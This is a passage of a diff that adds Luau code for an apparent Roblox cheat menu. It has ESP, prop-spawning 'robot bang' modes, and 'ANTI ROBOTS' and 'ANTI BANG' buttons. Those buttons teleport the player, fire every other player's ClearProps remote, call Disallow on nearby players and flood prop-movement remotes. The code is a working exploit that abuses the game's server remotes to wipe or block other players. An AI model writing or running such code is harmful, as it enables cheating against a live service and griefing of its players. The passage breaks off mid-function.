+espBtn.MouseButton1Click:Connect(function() 
+    activeModes["ESP"] = not activeModes["ESP"] 
+    local accent = espBtn:FindFirstChild("Accent")
+    
+    local tInfo1 = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    local tInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+    
+    if activeModes["ESP"] then 
+        TweenService:Create(espBtn, tInfo1, {BackgroundColor3 = Colors.ActiveTint, TextColor3 = Colors.Primary}):Play()
+        if accent then 
+            TweenService:Create(accent, tInfo2, {Size = UDim2.new(0, 4, 0.7, 0)}):Play() 
+        end
+        sendNotif("👁️ ESP CORE", "Tactical ESP Activated.", 2)
+    else 
+        TweenService:Create(espBtn, tInfo1, {BackgroundColor3 = Colors.Surface, TextColor3 = Colors.Text}):Play()
+        if accent then 
+            TweenService:Create(accent, tInfo1, {Size = UDim2.new(0, 0, 0, 0)}):Play() 
+        end 
+        sendNotif("👁️ ESP CORE", "Tactical ESP Deactivated.", 2)
+    end
+end)
+
+local rainbowBtn = createMainBtn("🌈 NEON PULSE GLOW", "Rainbow", false)
+rainbowBtn.MouseButton1Click:Connect(function() 
+    isRainbowEnabled = not isRainbowEnabled
+    activeModes["Rainbow"] = isRainbowEnabled
+    local accent = rainbowBtn:FindFirstChild("Accent")
+    
+    local tInfo1 = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    local tInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+    
+    if isRainbowEnabled then 
+        TweenService:Create(rainbowBtn, tInfo1, {BackgroundColor3 = Color3.fromRGB(35, 15, 55), TextColor3 = Colors.Purple}):Play()
+        if accent then 
+            accent.BackgroundColor3 = Colors.Purple
+            TweenService:Create(accent, tInfo2, {Size = UDim2.new(0, 4, 0.7, 0)}):Play() 
+        end
+        sendNotif("🌈 NEON GLOW", "Neon Pulse Glow Activated.", 2)
+    else 
+        TweenService:Create(rainbowBtn, tInfo1, {BackgroundColor3 = Colors.Surface, TextColor3 = Colors.Text}):Play()
+        if accent then 
+            accent.BackgroundColor3 = Colors.Primary
+            TweenService:Create(accent, tInfo1, {Size = UDim2.new(0, 0, 0, 0)}):Play() 
+        end 
+        sendNotif("🌈 NEON GLOW", "Neon Pulse Glow Deactivated.", 2)
+    end
+end)
+
+local soundBtn = createMainBtn("🔊 DYNAMIC AUDIO HOOK ( Multi-Track Random )", "Sound", false)
+soundBtn.MouseButton1Click:Connect(function() 
+    isSoundEnabled = not isSoundEnabled
+    activeModes["Sound"] = isSoundEnabled
+    local accent = soundBtn:FindFirstChild("Accent")
+    
+    local tInfo1 = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    local tInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+    
+    if isSoundEnabled then 
+        TweenService:Create(soundBtn, tInfo1, {BackgroundColor3 = Colors.ActiveTint, TextColor3 = Colors.Primary}):Play()
+        if accent then 
+            TweenService:Create(accent, tInfo2, {Size = UDim2.new(0, 4, 0.7, 0)}):Play() 
+        end
+        sendNotif("🔊 AUDIO HOOK", "Dynamic Audio Hook Activated.", 2)
+        task.spawn(PlayRobotBangMusic)
+    else 
+        TweenService:Create(soundBtn, tInfo1, {BackgroundColor3 = Colors.Surface, TextColor3 = Colors.Text}):Play()
+        if accent then 
+            TweenService:Create(accent, tInfo1, {Size = UDim2.new(0, 0, 0, 0)}):Play() 
+        end 
+        sendNotif("🔊 AUDIO HOOK", "Dynamic Audio Hook Deactivated.", 2)
+        task.spawn(StopRobotBangMusic) 
+    end
+end)
+
+local shieldBtn = createMainBtn("🛡️ ANTI SIT", "Shield", false)
+shieldBtn.MouseButton1Click:Connect(function() 
+    isGodShieldEnabled = not isGodShieldEnabled
+    activeModes["Shield"] = isGodShieldEnabled
+    local accent = shieldBtn:FindFirstChild("Accent")
+    
+    local tInfo1 = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    local tInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+    
+    if isGodShieldEnabled then 
+        TweenService:Create(shieldBtn, tInfo1, {BackgroundColor3 = Colors.ActiveTint, TextColor3 = Colors.Primary}):Play()
+        if accent then 
+            TweenService:Create(accent, tInfo2, {Size = UDim2.new(0, 4, 0.7, 0)}):Play() 
+        end
+        sendNotif("🛡️ SECURITY", "Anti Sit Activated.", 2)
+    else 
+        TweenService:Create(shieldBtn, tInfo1, {BackgroundColor3 = Colors.Surface, TextColor3 = Colors.Text}):Play()
+        if accent then 
+            TweenService:Create(accent, tInfo1, {Size = UDim2.new(0, 0, 0, 0)}):Play() 
+        end 
+        sendNotif("🛡️ SECURITY", "Anti Sit Deactivated.", 2)
+    end
+end)
+
+local houseProtBtn = createMainBtn("🏠 ANTI DELATE ROBOTS", "HouseProt", false)
+local isHouseProtEnabled = true
+activeModes["HouseProt"] = true
+
+houseProtBtn.BackgroundColor3 = Colors.ActiveTint
+houseProtBtn.TextColor3 = Colors.Primary
+local houseAccent = houseProtBtn:FindFirstChild("Accent")
+if houseAccent then houseAccent.Size = UDim2.new(0, 4, 0.7, 0) end
+
+houseProtBtn.MouseButton1Click:Connect(function() 
+    isHouseProtEnabled = not isHouseProtEnabled
+    activeModes["HouseProt"] = isHouseProtEnabled
+    local accent = houseProtBtn:FindFirstChild("Accent")
+    
+    local tInfo1 = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    local tInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+    
+    if isHouseProtEnabled then 
+        TweenService:Create(houseProtBtn, tInfo1, {BackgroundColor3 = Colors.ActiveTint, TextColor3 = Colors.Primary}):Play()
+        if accent then 
+            TweenService:Create(accent, tInfo2, {Size = UDim2.new(0, 4, 0.7, 0)}):Play() 
+        end
+        sendNotif("🏠 SECURITY", "Anti Delate Robots Activated.", 2)
+    else 
+        TweenService:Create(houseProtBtn, tInfo1, {BackgroundColor3 = Colors.Surface, TextColor3 = Colors.Text}):Play()
+        if accent then 
+            TweenService:Create(accent, tInfo1, {Size = UDim2.new(0, 0, 0, 0)}):Play() 
+        end 
+        sendNotif("🏠 SECURITY", "Anti Delate Robots Deactivated.", 2)
+    end
+end)
+
+local isVisualZoneEnabled = false
+activeModes["VisualZone"] = false
+local visualZoneBtn = createMainBtn("🛑 SHOW BAN ZONES ( Ban Zones & Props )", "VisualZone", false)
+visualZoneBtn.BackgroundColor3 = Colors.Surface
+visualZoneBtn.TextColor3 = Colors.Text
+
+local genjutsuCC = nil
+
+visualZoneBtn.MouseButton1Click:Connect(function()
+    isVisualZoneEnabled = not isVisualZoneEnabled
+    activeModes["VisualZone"] = isVisualZoneEnabled
+    local accent = visualZoneBtn:FindFirstChild("Accent")
+    
+    local tInfo1 = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    local tInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+    
+    if isVisualZoneEnabled then 
+        TweenService:Create(visualZoneBtn, tInfo1, {BackgroundColor3 = Color3.fromRGB(150, 20, 20), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+        if accent then 
+            TweenService:Create(accent, tInfo2, {Size = UDim2.new(0, 4, 0.7, 0)}):Play() 
+        end
+        sendNotif("🛑 TSUKUYOMI", "Domain Expansion: Clear Anime Genjutsu Active.", 3)
+        
+        task.spawn(function()
+            local sound = Instance.new("Sound")
+            sound.SoundId = "rbxassetid://7288361610"
+            sound.Volume = 2.5
+            sound.Parent = game:GetService("SoundService")
+            sound:Play()
+            task.delay(8, function() pcall(function() sound:Destroy() end) end)
+        end)
+
+        task.spawn(function()
+            local lighting = game:GetService("Lighting")
+            if not genjutsuCC or not genjutsuCC.Parent then
+                genjutsuCC = Instance.new("ColorCorrectionEffect")
+                genjutsuCC.Name = "TXR_Tsukuyomi"
+                genjutsuCC.Parent = lighting
+                genjutsuCC.TintColor = Color3.fromRGB(255, 255, 255)
+                genjutsuCC.Brightness = 0
+                genjutsuCC.Contrast = 0
+                genjutsuCC.Saturation = 0
+            end
+            
+            local ccTweenInfo = TweenInfo.new(3.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+            TweenService:Create(genjutsuCC, ccTweenInfo, {
+                TintColor = Color3.fromRGB(255, 180, 180),
+                Brightness = 0.05,
+                Contrast = 0.15,
+                Saturation = -0.2
+            }):Play()
+
+            local bloom = lighting:FindFirstChild("TXR_Tsukuyomi_Bloom")
+            if not bloom then
+                bloom = Instance.new("BloomEffect")
+                bloom.Name = "TXR_Tsukuyomi_Bloom"
+                bloom.Intensity = 0
+                bloom.Size = 24
+                bloom.Threshold = 0.1
+                bloom.Parent = lighting
+            end
+            TweenService:Create(bloom, ccTweenInfo, {Intensity = 0.4}):Play()
+            
+            if not lighting:FindFirstChild("TXR_Tsukuyomi_Atmosphere") then
+                local atmos = Instance.new("Atmosphere")
+                atmos.Name = "TXR_Tsukuyomi_Atmosphere"
+                atmos.Density = 0
+                atmos.Color = Color3.fromRGB(255, 220, 220)
+                atmos.Decay = Color3.fromRGB(100, 50, 50)
+                atmos.Glare = 0.2
+                atmos.Haze = 2
+                atmos.Parent = lighting
+                
+                TweenService:Create(atmos, ccTweenInfo, {Density = 0.04}):Play()
+            end
+        end)
+        
+        local lotsFolder = workspace:FindFirstChild("001_Lots")
+        if lotsFolder then
+            for _, lot in ipairs(lotsFolder:GetChildren()) do
+                local lotCFrame, lotSize = lot:GetBoundingBox()
+                local boxPart = Instance.new("Part")
+                boxPart.Name = "AsliBanZone_TXR"
+                boxPart.Anchored = true
+                boxPart.CanCollide = false
+                boxPart.Size = Vector3.new(lotSize.X, 0, lotSize.Z) 
+                boxPart.CFrame = lotCFrame
+                boxPart.Material = Enum.Material.Neon 
+                boxPart.Color = Color3.fromRGB(255, 60, 60)
+                boxPart.Transparency = 1
+                boxPart.CastShadow = false
+                boxPart.Parent = workspace
+                
+                local highlight = Instance.new("Highlight")
+                highlight.Adornee = boxPart
+                highlight.FillTransparency = 1
+                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+                highlight.OutlineTransparency = 1
+                highlight.DepthMode = Enum.HighlightDepthMode.Occluded
+                highlight.Parent = boxPart
+
+                local boxTweenInfo = TweenInfo.new(3.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+                TweenService:Create(boxPart, boxTweenInfo, {
+                    Size = Vector3.new(lotSize.X, 600, lotSize.Z),
+                    CFrame = lotCFrame * CFrame.new(0, 300, 0), 
+                    Transparency = 0.65
+                }):Play()
+                
+                TweenService:Create(highlight, boxTweenInfo, {
+                    FillTransparency = 0.75,
+                    OutlineTransparency = 0.2
+                }):Play()
+            end
+        end
+    else 
+        TweenService:Create(visualZoneBtn, tInfo1, {BackgroundColor3 = Colors.Surface, TextColor3 = Colors.Text}):Play()
+        if accent then 
+            TweenService:Create(accent, tInfo1, {Size = UDim2.new(0, 0, 0, 0)}):Play() 
+        end 
+        sendNotif("🛑 ZONES", "Genjutsu Released Smoothly.", 2)
+        
+        local lighting = game:GetService("Lighting")
+        local ccTweenInfo = TweenInfo.new(2.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+
+        if genjutsuCC then
+            local revertTween = TweenService:Create(genjutsuCC, ccTweenInfo, {
+                TintColor = Color3.fromRGB(255, 255, 255),
+                Brightness = 0,
+                Contrast = 0,
+                Saturation = 0
+            })
+            revertTween:Play()
+            revertTween.Completed:Connect(function() 
+                pcall(function() genjutsuCC:Destroy() genjutsuCC = nil end) 
+            end)
+        end
+        
+        local bloom = lighting:FindFirstChild("TXR_Tsukuyomi_Bloom")
+        if bloom then
+            local t = TweenService:Create(bloom, ccTweenInfo, {Intensity = 0})
+            t:Play()
+            t.Completed:Connect(function() pcall(function() bloom:Destroy() end) end)
+        end
+
+        local atmos = lighting:FindFirstChild("TXR_Tsukuyomi_Atmosphere")
+        if atmos then
+            local t = TweenService:Create(atmos, ccTweenInfo, {Density = 0})
+            t:Play()
+            t.Completed:Connect(function() pcall(function() atmos:Destroy() end) end)
+        end
+
+        for _, obj in ipairs(workspace:GetChildren()) do
+            if obj.Name == "AsliBanZone_TXR" then
+                task.spawn(function()
+                    local h = obj:FindFirstChildOfClass("Highlight")
+                    if h then
+                        TweenService:Create(h, TweenInfo.new(1.5), {OutlineTransparency = 1, FillTransparency = 1}):Play()
+                    end
+                    local t = TweenService:Create(obj, TweenInfo.new(2.0, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {Transparency = 1, Size = Vector3.new(obj.Size.X, 0, obj.Size.Z), CFrame = obj.CFrame * CFrame.new(0, -300, 0)})
+                    t:Play()
+                    t.Completed:Connect(function() pcall(function() obj:Destroy() end) end)
+                end)
+            end
+        end
+    end
+end)
+
+-- =========================================================
+-- 🛡️ ANTI ROBOTS (ADMIN ACCESS RESTRICTED)
+-- =========================================================
+local escapeBtn = createMainBtn("⚡ ANTI ROBOTS", nil, false)
+escapeBtn.BackgroundColor3 = Color3.fromRGB(180, 20, 50)
+escapeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+escapeBtn:SetAttribute("BaseColor", Color3.fromRGB(180, 20, 50))
+escapeBtn:SetAttribute("BaseText", Color3.fromRGB(255, 255, 255))
+
+local escapeDebounce = false
+
+escapeBtn.MouseButton1Click:Connect(function()
+    if not checkAdminAccess(lp) then
+        sendNotif("⛔ ACCESS DENIED", "🔒 VIP Admin Access Required!", 3)
+        return
+    end
+
+    local houseData = getMyHouse()
+    if not houseData then
+        sendNotif("⚠️ HOUSE REQUIRED", "House spawn nahi hai! Please pehle house spawn karo.", 3)
+        return
+    end
+
+    if escapeDebounce then return end
+    escapeDebounce = true
+    
+    task.spawn(function()
+        local success, err = pcall(function()
+            isEvading = true 
+            local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+            if not hrp then return end
+            
+            local originalPos = hrp.CFrame
+            local propsDetectedBefore = false
+            
+            local partsInRadius = workspace:GetPartBoundsInRadius(hrp.Position, 40)
+            for _, obj in ipairs(partsInRadius) do
+                if string.sub(obj.Name, 1, 4) == "Prop" then
+                    local ownerName = string.sub(obj.Name, 5)
+                    if ownerName ~= "" and ownerName ~= lp.Name then
+                        propsDetectedBefore = true
+                        break
+                    end
+                end
+            end
+
+            local com = workspace:FindFirstChild("WorkspaceCom")
+            if com then
+                for _, f in ipairs(com:GetChildren()) do
+                    for _, c in ipairs(f:GetChildren()) do
+                        if c.Name == "Prop" .. lp.Name then
+                            local pt = c:FindFirstChildWhichIsA("BasePart") or c.PrimaryPart
+                            local r = c:FindFirstChild("SetCurrentCFrame")
+                            if pt and r then
+                                task.spawn(function() pcall(function() r:InvokeServer(CFrame.new(pt.Position.X, 15000, pt.Position.Z)) end) end)
+                            end
+                        end
+                    end
+                end
+            end
+            task.wait(0.2) 
+            
+            if houseData then
+                local safePos = houseData.Lot.WorldPivot.Position + Vector3.new(0, 3, 0)
+                hrp.CFrame = CFrame.new(safePos) 
+                
+                if propsDetectedBefore then
+                    local maxWait = 0
+                    while maxWait < 0.7 do
+                        task.wait(0.05)
+                        maxWait = maxWait + 0.05
+                        local propsFollowed = false
+                        local checkParts = workspace:GetPartBoundsInRadius(hrp.Position, 40)
+                        for _, obj in ipairs(checkParts) do
+                            if string.sub(obj.Name, 1, 4) == "Prop" then
+                                local ownerName = string.sub(obj.Name, 5)
+                                if ownerName ~= "" and ownerName ~= lp.Name then
+                                    propsFollowed = true
+                                    break
+                                end
+                            end
+                        end
+                        if propsFollowed then break end
+                    end
+                end
+                
+                if houseData.Remote then
+                    for i = 1, 20 do
+                        task.spawn(function() pcall(function() houseData.Remote:InvokeServer() end) end)
+                        task.wait(0.01) 
+                    end
+                end
+                
+                task.wait(0.05) 
+                hrp.CFrame = originalPos
+                sendNotif("🚀 BOOM!", "Evaded & Wiped Attackers!", 2)
+            else
+                sendNotif("⚠️ ALERT", "House Not Found! Deploying Global Wipe...", 2)
+            end
+
+            task.spawn(function()
+                local myHouseData = getMyHouse()
+                local myClearRemote = myHouseData and myHouseData.Remote
+
+                for _, obj in ipairs(workspace:GetDescendants()) do
+                    if obj.Name == "Permissions:ClearProps" and obj:IsA("RemoteFunction") then
+                        if obj ~= myClearRemote then 
+                            task.spawn(function() pcall(function() obj:InvokeServer() end) end)
+                            task.wait(0.01) 
+                        end
+                    end
+                end
+            end)
+        end)
+        
+        if not success then warn("TXR Error:", err) end
+        task.wait(0.3) 
+        isEvading = false 
+        escapeDebounce = false
+    end)
+end)
+
+-- =========================================================
+-- 🚫 ANTI BANG (ADMIN ACCESS RESTRICTED & PIGGYBACK SAFE)
+-- =========================================================
+local banTrapBtn = createMainBtn("🛡️ ANTI BANG", nil, false)
+banTrapBtn.BackgroundColor3 = Color3.fromRGB(130, 0, 200)
+banTrapBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+banTrapBtn:SetAttribute("BaseColor", Color3.fromRGB(130, 0, 200))
+banTrapBtn:SetAttribute("BaseText", Color3.fromRGB(255, 255, 255))
+
+local banTrapDebounce = false
+
+banTrapBtn.MouseButton1Click:Connect(function()
+    if not checkAdminAccess(lp) then
+        sendNotif("⛔ ACCESS DENIED", "🔒 VIP Admin Access Required!", 3)
+        return
+    end
+
+    local houseData = getMyHouse()
+    if not houseData then
+        sendNotif("⚠️ HOUSE REQUIRED", "House spawn nahi hai! Please pehle house spawn karo.", 3)
+        return
+    end
+
+    if banTrapDebounce then return end
+    banTrapDebounce = true
+    
+    task.spawn(function()
+        local success, err = pcall(function()
+            isEvading = true 
+            local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+            if not hrp then return end
+            
+            local originalPos = hrp.CFrame
+            local attackersToBan = {}
+            local protectedVictims = {}
+            local propsDetectedBefore = false
+            
+            for _, desc in ipairs(lp.Character:GetDescendants()) do
+                if desc:IsA("Weld") or desc:IsA("Motor6D") or desc:IsA("WeldConstraint") then
+                    local p0, p1 = desc.Part0, desc.Part1
+                    local otherPart = (p0 and not p0:IsDescendantOf(lp.Character) and p0) or (p1 and not p1:IsDescendantOf(lp.Character) and p1)
+                    if otherPart then
+                        local model = otherPart:FindFirstAncestorOfClass("Model")
+                        if model and model ~= lp.Character then
+                            local vicPlayer = Players:GetPlayerFromCharacter(model)
+                            if vicPlayer then
+                                protectedVictims[vicPlayer] = true
+                                protectedVictims[model] = true
+                            end
+                        end
+                    end
+                end
+            end
+            
+            local scanParts = workspace:GetPartBoundsInRadius(hrp.Position, 40)
+            for _, obj in ipairs(scanParts) do
+                if string.sub(obj.Name, 1, 4) == "Prop" then
+                    local ownerName = string.sub(obj.Name, 5)
+                    if ownerName ~= "" and ownerName ~= lp.Name then
+                        propsDetectedBefore = true
+                        local p = Players:FindFirstChild(ownerName)
+                        if p and not protectedVictims[p] then 
+                            attackersToBan[p] = true 
+                        end
+                    end
+                end
+                local pModel = obj:FindFirstAncestorOfClass("Model")
+                if pModel and pModel ~= lp.Character and not protectedVictims[pModel] then
+                    local p = Players:GetPlayerFromCharacter(pModel)
+                    if p and not protectedVictims[p] then
+                        propsDetectedBefore = true
+                        attackersToBan[p] = true
+                    end
+                end
+            end
+            
+            for _, desc in ipairs(lp.Character:GetDescendants()) do
+                if desc:IsA("Weld") or desc:IsA("SeatWeld") then
+                    local safeParts = {}
+                    if desc.Part0 then table.insert(safeParts, desc.Part0) end
+                    if desc.Part1 then table.insert(safeParts, desc.Part1) end
+                    
+                    for _, pt in ipairs(safeParts) do
+                        if pt and pt.Parent and not pt:IsDescendantOf(lp.Character) then
+                            if string.sub(pt.Name, 1, 4) == "Prop" then
+                                local ownerName = string.sub(pt.Name, 5)
+                                if ownerName ~= "" and ownerName ~= lp.Name then
+                                    propsDetectedBefore = true
+                                    local p = Players:FindFirstChild(ownerName)
+                                    if p and not protectedVictims[p] then 
+                                        attackersToBan[p] = true 
+                                    end
+                                end
+                            end
+                            local pModel = pt:FindFirstAncestorOfClass("Model")
+                            if pModel and pModel ~= lp.Character and not protectedVictims[pModel] then
+                                local p = Players:GetPlayerFromCharacter(pModel)
+                                if p and not protectedVictims[p] then
+                                    attackersToBan[p] = true
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+
+            local com = workspace:FindFirstChild("WorkspaceCom")
+            if com then
+                for _, f in ipairs(com:GetChildren()) do
+                    for _, c in ipairs(f:GetChildren()) do
+                        if c.Name == "Prop" .. lp.Name then
+                            local pt = c:FindFirstChildWhichIsA("BasePart") or c.PrimaryPart
+                            local r = c:FindFirstChild("SetCurrentCFrame")
+                            if pt and r then
+                                task.spawn(function() pcall(function() r:InvokeServer(CFrame.new(pt.Position.X, 15000, pt.Position.Z)) end) end)
+                            end
+                        end
+                    end
+                end
+            end
+            task.wait(0.2)
+
+            if houseData then
+                local safePos = houseData.Lot.WorldPivot.Position + Vector3.new(0, 3, 0)
+                hrp.CFrame = CFrame.new(safePos) 
+                
+                local maxWait = 0
+                local attackerArrived = false
+                while maxWait < 2.0 do
+                    task.wait(0.05)
+                    maxWait = maxWait + 0.05
+                    
+                    local repeatScan = workspace:GetPartBoundsInRadius(hrp.Position, 40)
+                    for _, obj in ipairs(repeatScan) do
+                        if string.sub(obj.Name, 1, 4) == "Prop" then
+                            local ownerName = string.sub(obj.Name, 5)
+                            if ownerName ~= "" and ownerName ~= lp.Name then
+                                local p = Players:FindFirstChild(ownerName)
+                                if p and not protectedVictims[p] then 
+                                    attackersToBan[p] = true 
+                                    attackerArrived = true
+                                end
+                            end
+                        end
+                        local pModel = obj:FindFirstAncestorOfClass("Model")
+                        if pModel and pModel ~= lp.Character and not protectedVictims[pModel] then
+                            local p = Players:GetPlayerFromCharacter(pModel)
+                            if p and not protectedVictims[p] then
+                                attackersToBan[p] = true
+                                attackerArrived = true
+                            end
+                        end
+                    end
+                    
+                    if attackerArrived and maxWait >= 0.3 then 
+                        break 
+                    end
+                end
+                
+                if houseData.Disallow then
+                    for attacker, _ in pairs(attackersToBan) do
+                        if attacker and attacker.Parent and not protectedVictims[attacker] then
+                            task.spawn(function() pcall(function() houseData.Disallow:FireServer(attacker) end) end)
+                        end
+                    end
+                end
+
+                if houseData.Remote then
+                    for i = 1, 20 do
+                        task.spawn(function() pcall(function() houseData.Remote:InvokeServer() end) end)
+                        task.wait(0.01)
+                    end
+                end
+                
+                task.wait(0.1) 
+                hrp.CFrame = originalPos
+
+                if houseData.Allow then
+                    for attacker, _ in pairs(attackersToBan) do
+                        if attacker and attacker.Parent and not protectedVictims[attacker] then
+                            task.spawn(function()
+                                task.wait(0.5)
+                                pcall(function() houseData.Allow:FireServer(attacker) end)
+                            end)
+                        end
+                    end
+                end
+                
+                sendNotif("🚫 ANTI BANG", "Hacker Banned! Rescued Player is Safe!", 3)
+            else
+                sendNotif("⚠️ ALERT", "House Not Found! Cannot Trigger Trap.", 2)
+            end
+
+            task.spawn(function()
+                local myHouseData = getMyHouse()
+                local myClearRemote = myHouseData and myHouseData.Remote
+
+                for _, obj in ipairs(workspace:GetDescendants()) do
+                    if obj.Name == "Permissions:ClearProps" and obj:IsA("RemoteFunction") then
+                        if obj ~= myClearRemote then 
+                            task.spawn(function() pcall(function() obj:InvokeServer() end) end)
+                            task.wait(0.01) 
+                        end
+                    end
+                end
+            end)
+        end)
+        
+        if not success then warn("TXR Error:", err) end
+        task.wait(0.3) 
+        isEvading = false 
+        banTrapDebounce = false
+    end)
+end)
+
+-- =========================================================
+-- ⚡ START / STOP ENGINE CONTROLS
+-- =========================================================
+local toggleRow = Instance.new("Frame", mainList)
+toggleRow.Size = UDim2.new(1, 0, 0, 42)
+toggleRow.BackgroundTransparency = 1
+toggleRow.LayoutOrder = getOrder()
+toggleRow.ZIndex = 7
+
+local startBtn = Instance.new("TextButton", toggleRow)
+startBtn.Size = UDim2.new(0.48, 0, 1, 0)
+startBtn.BackgroundColor3 = Colors.Primary
+startBtn.Text = "▶ START"
+startBtn.TextColor3 = Colors.TextDark
+startBtn.Font = Enum.Font.GothamBlack
+startBtn.TextSize = 11
+startBtn.AutoButtonColor = false
+startBtn.ZIndex = 8
+
+local startCorner = Instance.new("UICorner", startBtn)
+startCorner.CornerRadius = UDim.new(0, 8)
+applySmartHover(startBtn, nil)
+
+local stopBtn = Instance.new("TextButton", toggleRow)
+stopBtn.Size = UDim2.new(0.48, 0, 1, 0)
+stopBtn.Position = UDim2.new(0.52, 0, 0, 0)
+stopBtn.BackgroundColor3 = Colors.Surface
+stopBtn.BackgroundTransparency = 0.5
+stopBtn.Text = "⏹ STOP"
+stopBtn.TextColor3 = Colors.Danger
+stopBtn.Font = Enum.Font.GothamBold
+stopBtn.TextSize = 11
+stopBtn.AutoButtonColor = false
+stopBtn.ZIndex = 8
+
+local stopCorner = Instance.new("UICorner", stopBtn)
+stopCorner.CornerRadius = UDim.new(0, 8)
+applySmartHover(stopBtn, nil)
+
+local stopStroke = Instance.new("UIStroke", stopBtn)
+stopStroke.Color = Colors.Danger
+stopStroke.Thickness = 1
+stopStroke.Transparency = 0.5
+crispText(startBtn)
+crispText(stopBtn)
+
+startBtn.MouseButton1Click:Connect(function() 
+    if isSystemActive then 
+        return 
+    end 
+    
+    isSystemActive = true
+    table.clear(assignedRemotes)
+    table.clear(voidedPlayers)
+    table.clear(targetVelocities)
+    
+    local tInfo = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    TweenService:Create(startBtn, tInfo, {BackgroundColor3 = Colors.PrimaryDark, TextColor3 = Colors.Text}):Play()
+    TweenService:Create(stopBtn, tInfo, {BackgroundColor3 = Colors.Danger, TextColor3 = Colors.TextDark}):Play()
+    TweenService:Create(stopStroke, tInfo, {Transparency = 1}):Play()
+    
+    if isSoundEnabled then 
+        task.spawn(PlayRobotBangMusic) 
+    end
+    
+    task.spawn(function() 
+        sendNotif("ENGINE CORE", "V18.26 Matrix Core Activated.", 2)
+        clearProps()
+        task.wait(0.4)
+        
+        local propName, propCategory = getActivePropData()
+        local count = (propName == "FurnitureBleachers") and 15 or 25
+
+        if activeModes["Chair"] and (activeModes["Robot"] or activeModes["MultiRobot"] or activeModes["HeadBang"] or activeModes["Orbit"] or activeModes["Ring"]) then
+            for i = 1, 10 do 
+                spawnProp("FurnitureBleachers", "Furniture")
+                task.wait(0.01) 
+            end
+            task.wait(0.05)
+            for i = 1, 15 do 
+                spawnProp(customPropName, customPropCategory)
+                task.wait(0.01) 
+            end
+        else
+            for i = 1, count do 
+                spawnProp(propName, propCategory)
+                task.wait(0.01) 
+            end
+        end
+    end) 
+end)
+
+stopBtn.MouseButton1Click:Connect(function()
+    if not isSystemActive then return end
+    isSystemActive = false
+    table.clear(assignedRemotes)
+    
+    local tInfo = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    TweenService:Create(startBtn, tInfo, {BackgroundColor3 = Colors.Primary, TextColor3 = Colors.TextDark}):Play()
+    TweenService:Create(stopBtn, tInfo, {BackgroundColor3 = Colors.Surface, TextColor3 = Colors.Danger}):Play()
+    TweenService:Create(stopStroke, tInfo, {Transparency = 0.5}):Play()
+    
+    if isSoundEnabled then 
+        task.spawn(StopRobotBangMusic) 
+    end
+    
+    task.spawn(function()
+        clearProps()
+        sendNotif("SYSTEM HALTED", "All props wiped automatically.", 2)
+    end)
+end)
+
+local lastRemoteScan = 0
+local cachedRemotes = {}
+
+local function getAvailableRemotes()
+    if tick() - lastRemoteScan < 0.25 then
+        local valid = {}
+        for _, r in ipairs(cachedRemotes) do
+            if r and r.Parent then 
+                table.insert(valid, r) 
+            end
+        end
+        return valid
+    end
+    
+    lastRemoteScan = tick()
+    table.clear(propsCache)
+    
+    local com = workspace:FindFirstChild("WorkspaceCom")
+    if com then 
+        for _, f in ipairs(com:GetChildren()) do 
+            for _, c in ipairs(f:GetChildren()) do 
+                if c.Name == "Prop" .. lp.Name then 
+                    table.insert(propsCache, c) 
+                end 
+            end 
+        end 
+    end
+    
+    local remotes = {}
+    for _, p in ipairs(propsCache) do 
+        local r = p:FindFirstChild("SetCurrentCFrame")
+        if r and r.Parent then 
+            table.insert(remotes, r) 
+        end 
+    end 
+    
+    cachedRemotes = remotes
+    return remotes
+end
+
+local function isRemoteAssigned(remote) 
+    for _, assigned in pairs(assignedRemotes) do 
+        if type(assigned) == "table" then 
+            for _, sr in pairs(assigned) do 
+                if sr == remote then 
+                    return true 
+                end 
+            end 
+        elseif assigned == remote then 
+            return true 
+        end 
+    end 
+    return false 
+end
+
+local lastRemoteFireTimes = {}
+local FIRE_INTERVAL = 0.035 
+
+local function dispatchRemote(remote, targetCFrame)
+    if not remote or not remote.Parent then return end
+    
+    local isEmergency = false
+    if activeModes["HouseProt"] then
+        local checkPos = targetCFrame.Position
+        local params = OverlapParams.new()
+        local ignoreList = {lp.Character}
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p.Character then table.insert(ignoreList, p.Character) end
+        end
+        if workspace:FindFirstChild("Vehicles") then table.insert(ignoreList, workspace.Vehicles) end
+        if workspace:FindFirstChild("WorkspaceCom") then table.insert(ignoreList, workspace.WorkspaceCom) end
+        params.FilterDescendantsInstances = ignoreList
+        params.FilterType = Enum.RaycastFilterType.Exclude
+        
+        local inDangerZone = false
+        local partsInBubble = workspace:GetPartBoundsInBox(CFrame.new(checkPos), Vector3.new(6, 100000, 6), params)
+        for _, hitInst in ipairs(partsInBubble) do
+            local currentInst = hitInst
+            local bName = string.lower(hitInst.Name)
